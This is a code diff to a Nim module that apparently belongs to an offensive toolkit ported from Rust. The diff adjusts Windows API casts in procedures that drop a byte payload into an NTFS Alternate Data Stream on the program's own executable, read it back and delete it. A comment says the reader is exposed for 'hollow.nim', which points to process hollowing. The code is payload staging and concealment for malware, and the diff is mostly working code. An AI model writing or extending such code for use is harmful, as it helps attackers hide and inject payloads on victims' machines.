@@ -16,7 +16,7 @@ const ADS_SUFFIX: array[5, uint16] = [
 proc ownExeWide(): seq[uint16] =
   # unsafe
   var buf = newSeq[uint16](512)
-  let len = GetModuleFileNameW(nil, cast[LPWSTR](addr buf[0]), 512)
+  let len = GetModuleFileNameW(0.HMODULE, cast[LPWSTR](addr buf[0]), 512)
   # GetModuleFileNameW returns count WITHOUT null — truncate faithfully
   buf.setLen(int(len))
   buf
@@ -30,15 +30,15 @@ proc adsPath(): seq[uint16] =
 
 proc dropToAds*(data: seq[byte]): bool =
   # unsafe
-  let path = adsPath()
+  var path = adsPath()
   let h = CreateFileW(
     cast[LPCWSTR](addr path[0]),
     GENERIC_WRITE,
     0,
-    nil,
+    cast[LPSECURITY_ATTRIBUTES](nil),
     CREATE_ALWAYS,
     0,
-    nil)
+    0.HANDLE)
   if h == INVALID_HANDLE_VALUE: return false
   var written: DWORD = 0
   let ok = WriteFile(
@@ -52,21 +52,21 @@ proc dropToAds*(data: seq[byte]): bool =
 
 proc dropFromAds*() =
   # unsafe
-  let path = adsPath()
+  var path = adsPath()
   discard DeleteFileW(cast[LPCWSTR](addr path[0]))
 
 # Public (was private in Rust) — hollow.nim needs to call this
 proc readAds*(): seq[byte] =
   # unsafe
-  let path = adsPath()
+  var path = adsPath()
   let h = CreateFileW(
     cast[LPCWSTR](addr path[0]),
     GENERIC_READ,
     FILE_SHARE_READ,
-    nil,
+    cast[LPSECURITY_ATTRIBUTES](nil),
     OPEN_EXISTING,
     0,
-    nil)
+    0.HANDLE)
   if h == INVALID_HANDLE_VALUE: return @[]
 
   var sizeHi: DWORD = 0
